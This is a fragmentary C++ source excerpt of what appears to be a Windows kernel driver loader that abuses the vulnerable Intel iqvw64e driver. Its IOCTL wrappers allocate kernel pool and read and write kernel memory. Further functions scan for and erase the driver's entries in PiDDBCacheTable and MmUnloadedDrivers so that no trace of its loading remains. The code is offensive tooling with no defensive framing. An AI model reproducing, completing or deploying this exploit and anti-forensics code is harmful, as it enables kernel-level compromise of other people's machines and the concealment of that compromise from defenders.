...
uint64_t AllocatePool(HANDLE h, size_t size)
{
    ...
    uint64_t outAddr = 0;
    DeviceIoControl(h, IOCTL_IQVW64_ALLOC_NONPAGED, &inSz, sizeof(inSz), &outAddr, sizeof(outAddr), &out, nullptr);
    return outAddr;
}
...
{
    DWORD out = 0;
    return !!DeviceIoControl(h, IOCTL_IQVW64_FREE_POOL, &addr, sizeof(addr), nullptr, 0, &out, nullptr);
}
...
bool ClearPiDdbCache(HANDLE h, const std::wstring&, uint32_t)
{
    ...
    static const uint8_t PAT_LOCK[] = { 0x48,0x8B,0x0D,0xCC,0xCC,0xCC,0xCC,0x4C,0x8B,0xC6,0xE8 };
    static const uint8_t PAT_TABLE[] = { 0x66,0x03,0xD2,0x48,0x8D,0x0D,0xCC,0xCC,0xCC,0xCC };
    ...
    if (!lockLocal || !tabLocal) {
        std::cerr << "[piddb] pattern not found\n";
        return false;
    }
    ...
    for (int i = 0; i < 512 && cur && cur != listHead; i++) {
        ...
        cur = _ReadQWord(h, cur);
    }

    if (!target) {
        std::cout << "[piddb] entry not found\n";
        return true;
    }
...
bool ClearMmUnloadedDrivers(HANDLE h, const std::wstring&)
{
    ...
    if (!ulLocal || !cntLocal) return false;
    ...
    for (uint32_t i = 0; i < MAX_ENTRIES; i++) {
            ...
            drvName.find(L"IQVW64E") != std::wstring::npos)
        {
            ...
            if (lastIdx > 0) _WriteQWord(h, cntKrn, lastIdx - 1);
            std::cout << "[mmul] entry cleared\n";
            return true;
        }
    }

    std::cout << "[mmul] iqvw64e not found\n";
    return true;
}
...
static bool _ReadKMem(HANDLE h, void* dst, uint64_t src, size_t sz)
{
    ...
    DWORD out = 0;
    return !!DeviceIoControl(h, IOCTL_IQVW64_READ_PHYS, &req, sizeof(req), dst, (DWORD)sz, &out, nullptr);
}
...
static bool _WriteKMem(HANDLE h, uint64_t dst, const void* src, size_t sz)
{
    ...
    DWORD out = 0;
    return !!DeviceIoControl(h, IOCTL_IQVW64_COPY_MEMORY, &req, sizeof(req), nullptr, 0, &out, nullptr);
}
